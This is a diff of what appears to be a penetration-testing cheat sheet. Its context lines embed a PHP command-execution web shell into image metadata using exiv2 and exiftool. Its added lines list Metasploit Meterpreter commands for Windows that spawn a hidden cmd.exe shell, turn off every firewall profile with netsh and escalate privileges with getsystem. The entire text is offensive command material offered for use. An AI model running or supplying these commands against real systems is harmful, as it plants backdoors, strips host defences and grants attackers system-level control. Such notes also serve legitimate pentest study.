@@ -29,3 +29,14 @@ Inject PHP into image
 exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
 exiftool “-comment<=back.php” back.png
 ~~~
+
+**Windows**
+
+Metasploit windows meterpreter session
+~~~
+execute -f cmd.exe -c -H
+shell
+netsh firewall show opmode
+netsh advfirewall set allprofiles state off
+getsystem
+~~~
